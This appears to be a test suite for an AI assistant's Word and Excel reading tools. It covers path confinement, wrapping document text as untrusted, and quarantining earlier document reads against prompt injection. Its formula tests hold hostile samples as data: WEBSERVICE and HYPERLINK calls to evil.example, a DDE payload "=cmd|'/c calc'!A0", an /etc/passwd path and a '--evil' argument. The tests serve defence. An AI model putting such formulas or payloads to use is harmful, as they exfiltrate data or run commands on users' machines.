/**
 * D1: reading Word and Excel files through (pretend) WordCraft and GridCraft tools.
 * Which files can be opened, what reaches the tools, what the model is handed, the card and
 * viewer behind doc_show, and doc_open_app's place among device changes.
 */
import { mkdtempSync, readFileSync, renameSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  AuditLog,
  DocEngine,
  DocFiles,
  DocPathError,
  DocumentFiles,
  type Run,
  Store,
  SystemActions,
  SystemControls,
  ToolRegistry,
  createServer,
  docTools,
  formatGrid,
  formulaProblem,
  parseCsv,
  parseRange,
  quarantineEarlierEmail,
  quarantineNote,
  runCli,
  systemTools,
  Shell,
  type Delta,
  type ModelRequest,
  type ModelResult,
} from '@aios/core';
import type { ChatItem } from '@aios/shared';
import { parseConfig } from '@aios/shared';
import { describe, expect, it } from 'vitest';
import { makeDocFixture } from '../../fixtures/documents.js';

function rig(o: { untrusted?: boolean; openFails?: boolean } = {}) {
  const fx = makeDocFixture();
  const dir = mkdtempSync(join(tmpdir(), 'aios-docs-audit-'));
  const auditPath = join(dir, 'audit.jsonl');
  const audit = new AuditLog(auditPath);
  const store = new Store(':memory:');
  const files = new DocFiles({ roots: ['~/Documents'], home: fx.home });
  const engine = new DocEngine({ wordCli: fx.wordCli, sheetCli: fx.sheetCli, timeoutMs: 10_000 });
  const posted: ChatItem[] = [];
  const viewer = new DocumentFiles({ store, files, engine, audit, post: (i) => (store.saveItem(i), posted.push(i)) });
  const opened: string[] = [];
  const steps: string[] = [];
  const docs = docTools({
    files,
    engine,
    viewer,
    open: async (kind, path) => {
      if (o.openFails) throw new Error('gridcraft is not installed');
      opened.push(`${kind} ${path}`);
    },
    window: { appStarting: async (n) => void steps.push(`orb for ${n}`), appFailed: async (n) => void steps.push(`back from ${n}`) },
  });
  const run: Run = async () => ({ stdout: '', code: 0 });
  const actions = new SystemActions({ store, controls: new SystemControls(run), audit, show: (i, isNew) => void (isNew && posted.push(i)), notice: () => undefined, isPaused: () => false });
  const tools = new ToolRegistry(audit);
  for (const t of systemTools({ controls: new SystemControls(run), actions, extra: docs })) tools.register(t);
  const call = (name: string, args: unknown, untrustedInContext = o.untrusted ?? false) =>
    tools.execute({ id: name, name, arguments: JSON.stringify(args) }, { signal: new AbortController().signal, untrustedInContext, userText: 'look' });
  const log = () => readFileSync(auditPath, 'utf8').trim().split('\n').map((l) => JSON.parse(l) as Record<string, unknown>);
  return { fx, files, engine, viewer, tools, call, posted, opened, steps, log, store, audit, actions };
}

describe('which documents can be opened', () => {
  it('accepts .docx and .xlsx files inside the folders, by ~/ path, absolute path or name', async () => {
    const { fx, files } = rig();
    const real = (p: string) => join(fx.documents, p);
    expect((await files.resolve('~/Documents/report.docx')).path).toBe(real('report.docx'));
    expect((await files.resolve('report.docx')).path).toBe(real('report.docx'));
    expect((await files.resolve(real('Finance/sales.xlsx'))).kind).toBe('sheet');
    expect((await files.resolve('Finance/sales.xlsx')).display).toBe('~/Documents/Finance/sales.xlsx');
  });

  it('refuses files outside the folders, links leading out, hidden files, fakes and other types', async () => {
    const { fx, files } = rig();
    const refused = async (p: string) => {
      const err = await files.resolve(p).then(() => null, (e: unknown) => e);
      expect(err, p).toBeInstanceOf(DocPathError);
      return (err as Error).message;
    };
    expect(await refused(join(fx.home, 'Private', 'secret.docx'))).toMatch(/only files in ~\/Documents/);
    expect(await refused('../Private/secret.docx')).toMatch(/only files in ~\/Documents/);
    expect(await refused('link.docx')).toMatch(/only files in ~\/Documents/);
    expect(await refused('.hidden/x.docx')).toMatch(/hidden/);
    expect(await refused('fake.docx')).toMatch(/not really a \.docx/);
    expect(await refused('notes.txt')).toMatch(/only Word \(\.docx\) and Excel/);
    expect(await refused('missing.docx')).toMatch(/there is no file/);
    expect(await refused('/etc/passwd')).toMatch(/only files in/);
  });

  it('lists documents without following links or looking into hidden folders', async () => {
    const { files } = rig();
    const { files: list } = await files.list();
    const names = list.map((f) => f.display).sort();
    expect(names).toEqual(['~/Documents/Finance/sales.xlsx', '~/Documents/fake.docx', '~/Documents/hostile.docx', '~/Documents/hostile.xlsx', '~/Documents/report.docx']);
    expect((await files.list('sales')).files.map((f) => f.name)).toEqual(['sales.xlsx']);
  });

  it('says so when the folder does not exist', async () => {
    const files = new DocFiles({ roots: ['~/Nope'], home: mkdtempSync(join(tmpdir(), 'aios-nohome-')) });
    await expect(files.resolve('a.docx')).rejects.toThrow(/none of the document folders \(~\/Nope\) exist/);
  });
});

describe('ranges, formulas and CSV', () => {
  it('parses A1 ranges and counts their cells', () => {
    expect(parseRange('b4:f15')).toMatchObject({ text: 'B4:F15', cells: 5 * 12 });
    expect(parseRange('F15:B4')?.text).toBe('B4:F15');
    expect(parseRange('$C$7')?.text).toBe('C7:C7');
    expect(parseRange('A1:XFD1048576')?.cells).toBe(16_384 * 1_048_576);
    for (const bad of ['A0', '1A', 'A1:B2:C3', 'XFE1', 'Sheet1!A1', '--sheet', '']) expect(parseRange(bad), bad).toBeNull();
  });

  it('allows calculations and refuses anything that reaches outside the workbook', () => {
    expect(formulaProblem('=SUM(D2:D40)')).toBeNull();
    expect(formulaProblem('=AVERAGEIF(B:B,"North",D:D)')).toBeNull();
    expect(formulaProblem('=XLOOKUP("b",{"a","b"},{1,2})')).toBeNull();
    expect(formulaProblem('="WEBSERVICE(x)"')).toBeNull();
    expect(formulaProblem('SUM(A1)')).toMatch(/starts with =/);
    expect(formulaProblem('=WEBSERVICE("https://evil.example/?"&A1)')).toMatch(/WEBSERVICE can't be used/);
    expect(formulaProblem('=webservice("x")')).toMatch(/WEBSERVICE/);
    expect(formulaProblem('=_xlfn.WEBSERVICE("x")')).toMatch(/WEBSERVICE/);
    expect(formulaProblem('=SUM([other.xlsx]Sheet1!A1)')).toMatch(/only refer to cells in this workbook/);
    expect(formulaProblem("=cmd|'/c calc'!A0")).toMatch(/only refer to cells in this workbook/);
    expect(formulaProblem('=INDIRECT("A1")')).toMatch(/INDIRECT/);
    expect(formulaProblem('=INFO("directory")')).toMatch(/INFO/);
    expect(formulaProblem('=HYPERLINK("https://evil.example")')).toMatch(/HYPERLINK/);
    expect(formulaProblem('="unclosed')).toMatch(/unclosed quote/);
  });

  it('reads quoted CSV fields with commas, quotes and line breaks', () => {
    expect(parseCsv('a,"b,c","say ""hi"""\r\n"two\nlines",,x\n')).toEqual([
      ['a', 'b,c', 'say "hi"'],
      ['two\nlines', '', 'x'],
    ]);
  });

  it('draws a grid with addresses from the range start, without trailing empties', () => {
    expect(formatGrid([['x', '', ''], ['a|b', '2', ''], ['', '', '']], { col: 2, row: 4 })).toBe(' | B | C\n4 | x | \n5 | a/b | 2');
    expect(formatGrid([['', '']], { col: 1, row: 1 })).toBe('(all empty)');
  });
});

describe('reading documents', () => {
  it('doc_read hands the model the text, wrapped as untrusted, from the resolved path', async () => {
    const { call, fx, log } = rig();
    const r = await call('doc_read', { path: 'report.docx' });
    expect(r.ok).toBe(true);
    expect(r.content).toMatch(/^~\/Documents\/report\.docx \(Word, \d+ bytes\)\.\n<untrusted source="document" id="__Documents_report\.docx">\n/);
    expect(r.content).toContain('Renew the office lease by 15 November');
    expect(fx.calls()).toEqual([{ tool: 'word', args: ['text', join(fx.documents, 'report.docx')] }]);
    expect(log().at(-1)).toMatchObject({ tool: 'doc_read', tier: 'read', decision: 'allowed', ok: true, path: join(fx.documents, 'report.docx') });
    // The audit log never holds the document's text.
    expect(JSON.stringify(log())).not.toContain('office lease');
  });

  it('doc_read gives long documents in parts', async () => {
    const { engine, files, viewer } = rig();
    const long = 'x'.repeat(30_000);
    const tools = docTools({ files, engine: { ...engine, wordText: async () => long, sheetNames: engine.sheetNames.bind(engine), sheetRange: engine.sheetRange.bind(engine), evaluate: engine.evaluate.bind(engine) }, viewer, open: async () => undefined, window: { appStarting: async () => undefined, appFailed: async () => undefined } });
    const read = tools.find((t) => t.def.name === 'doc_read')!;
    const first = await read.handler({ path: 'report.docx' }, { signal: new AbortController().signal, untrustedInContext: false, userText: '' });
    expect(typeof first === 'string' ? first : first.content).toMatch(/Characters 0–12000 of 30000\. Call doc_read with from=12000/);
    const last = await read.handler({ path: 'report.docx', from: 24_000 }, { signal: new AbortController().signal, untrustedInContext: false, userText: '' });
    expect(typeof last === 'string' ? last : last.content).toMatch(/Characters 24000–30000 of 30000\. This is the end\./);
  });

  it('doc_read and sheet_read point at each other for the wrong kind of file, and refuse paths outside', async () => {
    const { call, fx } = rig();
    expect((await call('doc_read', { path: 'Finance/sales.xlsx' })).content).toBe('Error: ~/Documents/Finance/sales.xlsx is an Excel file; use sheet_read or sheet_eval.');
    expect((await call('sheet_read', { path: 'report.docx' })).content).toBe('Error: ~/Documents/report.docx is a Word file; use doc_read.');
    expect((await call('doc_read', { path: join(fx.home, 'Private', 'secret.docx') })).content).toMatch(/^Error: only files in ~\/Documents can be opened/);
    expect(fx.calls()).toEqual([]);
  });

  it('sheet_read shows cells with their addresses and the sheet names', async () => {
    const { call, fx } = rig();
    const r = await call('sheet_read', { path: 'Finance/sales.xlsx', range: 'A1:D5' });
    expect(r.content).toContain('Sheets: Sales, Notes');
    expect(r.content).toContain(' | A | B | C | D\n1 | Product | Region | Units | Revenue\n2 | Lamp | North | 120 | 2400');
    expect(fx.calls().at(-1)).toEqual({ tool: 'sheet', args: ['cat', join(fx.documents, 'Finance/sales.xlsx'), '--range', 'A1:D5', '--csv'] });
    const notes = await call('sheet_read', { path: 'Finance/sales.xlsx', sheet: 'Notes', range: 'A1' });
    expect(notes.content).toContain('1 | Prices in EUR');
    expect(fx.calls().at(-1)!.args).toEqual(['cat', join(fx.documents, 'Finance/sales.xlsx'), '--range', 'A1:A1', '--sheet', 'Notes', '--csv']);
  });

  it('sheet_read defaults to A1:Z75, caps the cells per call and checks sheet names', async () => {
    const { call, fx } = rig();
    expect((await call('sheet_read', { path: 'Finance/sales.xlsx' })).content).toMatch(/No range was given, so this is A1:Z75/);
    expect((await call('sheet_read', { path: 'Finance/sales.xlsx', range: 'A1:Z100' })).content).toBe('Error: A1:Z100 is 2600 cells; read at most 2000 at a time, in parts.');
    expect((await call('sheet_read', { path: 'Finance/sales.xlsx', range: 'Sheet1!A1' })).content).toMatch(/^Error: give the range in A1 notation/);
    const wrong = await call('sheet_read', { path: 'Finance/sales.xlsx', sheet: '--evil' });
    expect(wrong.content).toMatch(/^Error: there is no sheet with that name\. The sheets are:\n<untrusted source="document"/);
    expect(fx.calls().some((c) => c.args.includes('--evil'))).toBe(false);
  });

  it('sheet_eval gets the figure from GridCraft and never runs a refused formula', async () => {
    const { call, fx } = rig();
    const r = await call('sheet_eval', { path: 'Finance/sales.xlsx', formula: '=SUM(D2:D5)' });
    expect(r.content).toMatch(/^=SUM\(D2:D5\) in ~\/Documents\/Finance\/sales\.xlsx, worked out by GridCraft:\n<untrusted source="document"[^>]*>\n19850\n<\/untrusted>$/);
    expect(fx.calls().at(-1)).toEqual({ tool: 'sheet', args: ['eval', '=SUM(D2:D5)', '--in', join(fx.documents, 'Finance/sales.xlsx'), '--json'] });
    const before = fx.calls().length;
    expect((await call('sheet_eval', { path: 'Finance/sales.xlsx', formula: '=WEBSERVICE("https://evil.example/"&A1)' })).content).toMatch(/^Error: WEBSERVICE can't be used here/);
    expect((await call('sheet_eval', { path: 'Finance/sales.xlsx', formula: '=SUM([x.xlsx]A!A1)' })).content).toMatch(/^Error: formulas can only refer to cells in this workbook/);
    expect(fx.calls()).toHaveLength(before);
  });

  it('docs_list wraps file names as untrusted', async () => {
    const { call } = rig();
    const r = await call('docs_list', {});
    expect(r.content).toMatch(/^5 documents in ~\/Documents, newest first\./);
    expect(r.content).toMatch(/<untrusted source="document" id="file-list">\n- ~\/Documents\/[^\n]+ \((Word|Excel), /);
    expect((await call('docs_list', { query: 'nothing-like-this' })).content).toMatch(/^No Word or Excel file in ~\/Documents has/);
  });

  it('every reading tool is marked as returning untrusted text; doc_show and doc_open_app are not', () => {
    const { tools } = rig();
    expect(['docs_list', 'doc_read', 'sheet_read', 'sheet_eval'].map((n) => tools.returnsUntrusted(n))).toEqual([true, true, true, true]);
    expect(['doc_show', 'doc_open_app'].map((n) => tools.returnsUntrusted(n))).toEqual([false, false]);
  });

  it('says plainly when WordCraft is not installed', async () => {
    const fx = makeDocFixture();
    const files = new DocFiles({ roots: ['~/Documents'], home: fx.home });
    const engine = new DocEngine({ wordCli: join(fx.home, 'no-such-wordcraft-cli'), sheetCli: fx.sheetCli, timeoutMs: 5000 });
    await expect(engine.wordText((await files.resolve('report.docx')).path)).rejects.toThrow(/no-such-wordcraft-cli is not installed/);
  });

  it('runCli stops a tool that hangs or floods its output', async () => {
    await expect(runCli('node', ['-e', 'setTimeout(() => {}, 10000)'], 'Slow', { timeoutMs: 200 })).rejects.toThrow('Slow took too long');
    await expect(runCli('node', ['-e', 'process.stdout.write("x".repeat(100000))'], 'Loud', { timeoutMs: 5000, maxBytes: 1000 })).rejects.toThrow(/more output/);
    await expect(runCli('node', ['-e', 'console.error("bad file"); process.exit(3)'], 'Tool', { timeoutMs: 5000 })).rejects.toThrow('Tool failed: bad file');
    // No secrets from the service's environment reach the tools.
    process.env.AIOS_TEST_SECRET = 'x';
    expect(await runCli('node', ['-e', 'process.stdout.write(String(process.env.AIOS_TEST_SECRET))'], 'Env', { timeoutMs: 5000 })).toBe('undefined');
    delete process.env.AIOS_TEST_SECRET;
  });
});

describe('showing documents', () => {
  it('doc_show posts a card and tells the model nothing of the file', async () => {
    const { call, posted, fx } = rig();
    const r = await call('doc_show', { path: 'report.docx' });
    expect(r.content).toBe('A card for the Word file is in the chat; the user opens it with its Open button. Say so in one line.');
    expect(posted).toEqual([expect.objectContaining({ kind: 'document', name: 'report.docx', fileKind: 'word', path: join(fx.documents, 'report.docx') })]);
    expect(posted[0]!.id).toMatch(/^doc-[0-9a-f-]{36}$/);
    expect(fx.calls()).toEqual([]);
  });

  it('Open shows a Word file as the PDF WordCraft made, and a workbook as cells', async () => {
    const { call, posted, viewer, fx, log } = rig();
    await call('doc_show', { path: 'report.docx' });
    await call('doc_show', { path: 'Finance/sales.xlsx' });
    const word = await viewer.file(posted[0]!.id);
    expect(word && 'kind' in word && word.kind === 'pdf' && word.bytes.toString('latin1').startsWith('%PDF-')).toBe(true);
    expect(fx.calls()[0]!.args.slice(0, 2)).toEqual(['convert', join(fx.documents, 'report.docx')]);
    expect(fx.calls()[0]!.args[2]).toMatch(/aios-doc-[^/]+\/document\.pdf$/);
    const sheet = await viewer.file(posted[1]!.id);
    expect(sheet && 'kind' in sheet && sheet.kind === 'sheet' ? sheet.view.sheets.map((s) => [s.name, s.rows[1]?.slice(0, 4)]) : sheet).toEqual([
      ['Sales', ['Lamp', 'North', '120', '2400']],
      ['Notes', undefined],
    ]);
    expect(log().filter((e) => e.event === 'document_opened').map((e) => e.ok)).toEqual([true, true]);
    expect(await viewer.file('doc-00000000-0000-0000-0000-000000000000')).toBeNull();
  });

  it('checks the file again on every open', async () => {
    const { call, posted, viewer, fx } = rig();
    await call('doc_show', { path: 'report.docx' });
    renameSync(join(fx.documents, 'report.docx'), join(fx.home, 'Private', 'report.docx'));
    expect(await viewer.file(posted[0]!.id)).toEqual({ error: expect.stringMatching(/^This file can't be opened now: there is no file/) });
    expect(fx.calls()).toEqual([]);
  });

  it('serves documents only to this computer\'s own pages, with the attachment headers', async () => {
    const { call, posted, viewer, store, audit } = rig();
    await call('doc_show', { path: 'Finance/sales.xlsx' });
    const model = {
      async *stream(_req: ModelRequest): AsyncGenerator<Delta, ModelResult> {
        const r: ModelResult = { content: 'ok', toolCalls: [], finishReason: 'stop', usage: null, model: 'm', provider: null, generationId: null, latencyMs: 1, ttftMs: 1, attempts: 1 };
        yield { type: 'done', result: r };
        return r;
      },
    };
    const shell = new Shell({ store, model, tools: new ToolRegistry(audit), audit, userName: 'John', timeZone: 'UTC', modelName: 'm', costCapUsd: 2, readBattery: async () => null, readWifi: async () => null });
    const port = 20_000 + Math.floor(Math.random() * 20_000);
    const app = await createServer(shell, { port, documents: viewer });
    try {
      const host = { host: `127.0.0.1:${port}` };
      const ok = await app.inject({ method: 'GET', url: `/documents/${posted[0]!.id}`, headers: host });
      expect(ok.statusCode).toBe(200);
      expect(ok.headers['content-type']).toMatch(/^application\/json/);
      expect(ok.headers['content-security-policy']).toBe("default-src 'none'; sandbox");
      expect(ok.headers['x-content-type-options']).toBe('nosniff');
      expect(JSON.parse(ok.body).sheets[0].name).toBe('Sales');
      expect((await app.inject({ method: 'GET', url: `/documents/${posted[0]!.id}`, headers: { ...host, 'sec-fetch-site': 'cross-site' } })).statusCode).toBe(403);
      expect((await app.inject({ method: 'GET', url: '/documents/report.docx', headers: host })).statusCode).toBe(404);
      expect((await app.inject({ method: 'GET', url: `/documents/${posted[0]!.id}`, headers: { host: 'evil.example' } })).statusCode).toBe(403);
    } finally {
      await app.close();
    }
  });
});

describe('opening documents in their app', () => {
  it('moves the chat aside and opens the resolved file in GridCraft', async () => {
    const { call, opened, steps, fx, log } = rig();
    const r = await call('doc_open_app', { path: 'Finance/sales.xlsx' });
    expect(r.content).toMatch(/^Opened it in GridCraft\. The chat is now the red orb/);
    expect(steps).toEqual(['orb for GridCraft']);
    expect(opened).toEqual([`sheet ${join(fx.documents, 'Finance/sales.xlsx')}`]);
    expect(log().at(-1)).toMatchObject({ tool: 'doc_open_app', tier: 'device', decision: 'allowed', app: 'GridCraft' });
  });

  it('brings the chat back when the app does not start', async () => {
    const { call, steps } = rig({ openFails: true });
    const r = await call('doc_open_app', { path: 'Finance/sales.xlsx' });
    expect(r.ok).toBe(false);
    expect(r.content).toBe("Error: GridCraft didn't start: gridcraft is not installed");
    expect(steps).toEqual(['orb for GridCraft', 'back from GridCraft']);
  });

  it('while outside text is in view it only shows a card, and the click opens it', async () => {
    const { call, opened, posted, actions, store } = rig();
    const r = await call('doc_open_app', { path: 'report.docx' }, true);
    expect(r.content).toMatch(/^Because an email or other outside text is in view, this was not done/);
    expect(opened).toEqual([]);
    const card = posted.find((i): i is Extract<ChatItem, { kind: 'action' }> => i.kind === 'action')!;
    expect(card.title).toMatch(/^Open “report\.docx” in WordCraft\? This was asked for while I was reading/);
    store.saveItem(card);
    await actions.confirm(card.id, card.hash);
    expect(opened).toHaveLength(1);
  });
});

describe('document quarantine', () => {
  it('folds an earlier exchange that read a document into a note', () => {
    const toolCall = { id: 'c1', name: 'doc_read', arguments: '{"path":"hostile.docx"}' };
    const msgs = quarantineEarlierEmail(
      [
        { role: 'system', content: 's' },
        { role: 'user', content: 'summarize hostile.docx' },
        { role: 'assistant', content: null, toolCalls: [toolCall] },
        { role: 'tool', toolCallId: 'c1', name: 'doc_read', content: '<untrusted source="document" id="x">evil</untrusted>' },
        { role: 'assistant', content: 'It says evil things.' },
        { role: 'user', content: 'thanks' },
      ],
      (n) => n === 'doc_read',
    );
    expect(msgs.map((m) => m.content)).toEqual(['s', 'summarize hostile.docx', quarantineNote([], false, true), 'thanks']);
    expect(quarantineNote([], false, true)).toBe('(Answering this, I read a document. That exchange is hidden from me now, because outside text can carry instructions. If the user refers to it, read it again.)');
    expect(quarantineNote(['INBOX:1'], true, true)).toMatch(/^\(Answering this, I read email INBOX:1, the calendar and a document\./);
  });
});

describe('config', () => {
  const base = `
[user]
name = "John"
timezone = "UTC"
[models.chat]
baseUrl = "https://example.test/v1"
model = "m"
apiKeyRef = "keyring:x"
[models.triage]
baseUrl = "https://example.test/v1"
model = "m"
apiKeyRef = "keyring:x"
[models.nightly]
baseUrl = "https://example.test/v1"
model = "m"
apiKeyRef = "keyring:x"
[mail]
address = "john@aios.test"
username = "john@aios.test"
passwordRef = "keyring:mail"
imap = { host = "127.0.0.1", port = 3143, tls = false }
smtp = { host = "127.0.0.1", port = 3025, tls = false }
`;
  it('reads Documents with the CLIs on PATH by default, and takes other folders and paths', () => {
    expect(parseConfig(base).docs).toEqual({ enabled: true, roots: ['~/Documents'], wordCli: 'wordcraft-cli', sheetCli: 'gridcraft-cli', wordApp: 'wordcraft', sheetApp: 'gridcraft', timeoutSeconds: 12 });
    const custom = parseConfig(`${base}[docs]\nroots = ["~/Work"]\nwordCli = "/opt/wordcraft/wordcraft-cli"\n`).docs;
    expect(custom.roots).toEqual(['~/Work']);
    expect(custom.wordCli).toBe('/opt/wordcraft/wordcraft-cli');
  });
});
